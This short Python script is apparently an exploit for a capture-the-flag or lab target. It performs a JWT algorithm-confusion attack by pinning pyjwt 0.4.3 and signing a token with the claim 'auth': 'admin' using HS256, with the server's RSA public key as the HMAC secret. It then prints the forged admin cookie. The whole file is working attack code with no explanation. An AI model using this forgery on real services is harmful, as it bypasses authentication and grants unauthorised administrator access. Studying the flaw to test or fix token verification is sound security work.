#!/usr/bin/python3

import jwt

#pyjwt==0.4.3

pubkey = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtnREuAwK7M/jWZdSVNfN
4m+kX0rqakI6KIR/qzT/Fv7hfC5vg9UJgEaAGOfexmoDMBYTLRSHnQ9EYjF6bkCh
w+NVQCqsvy9psZVnjUHQ6QfVUdyrUcsOuRoMMaEBYp+qCegDY5Vp65Wzk05qXfvK
LJK9apOo0pPgD7fdOhpqwzejxgWxUgYvMqkGQS2aCC51ePvC6edkStNxovoDFvXk
uG69/7jEqs2k2pk5mI66MR+2U46ub8hPUk7WA6zTGHhIMuxny+7ivxYIXCqEbZGV
YhOuubXfAPrVN2UpL4YBvtfmHZMmjp2j39PEqxXU70kTk96xq3WhnYm46HhciyIz
zQIDAQAB
-----END PUBLIC KEY-----
"""

cookie = jwt.encode({"auth": "admin"}, pubkey, algorithm="HS256")

print(cookie.decode())
